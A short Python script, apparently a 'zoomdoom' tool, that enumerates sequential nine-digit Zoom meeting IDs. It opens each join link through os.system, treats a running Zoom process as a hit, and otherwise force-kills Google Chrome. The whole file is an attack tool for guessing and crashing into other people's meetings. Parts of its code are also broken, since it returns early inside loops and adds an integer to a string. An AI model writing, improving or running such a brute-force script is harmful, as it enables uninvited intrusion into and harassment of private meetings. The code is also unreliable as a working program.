import psutil
import os

zoomid = 999999999
s = 0
def meetingId(amount):
    p = 000000000
    for i in range(amount):
        p += 1
    ps = str(p)
    plen = len(ps)
    plent = 9 - plen
    total = ''
    for i in range(plent):
        total = total + str('0') 
    p1 = total + ps
    return p1

def linkbomb(link):
    global s
    for i in range(zoomid):
        link1 = link + meetingId(s)
        s += 1
        print(link1)
        return link1
    
def paralized():
    for i in range(zoomid):
        link = linkbomb('https://www.zoom.us/join/')
        return link
        

def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

def payload():
    payload = os.system('open \'\' ' + paralized())
    return payload
def zoomdoom():
    print('zoombombing...')
    for i in range(zoomid):
        payload()
        testedlink = [i]
        print(testedlink)
        if checkIfProcessRunning('zoom.us'):
            call = payload()
            print('link is valid:' + call)
            break
        else:
            os.system('pkill Google\ Chrome')
        
zoomdoom()
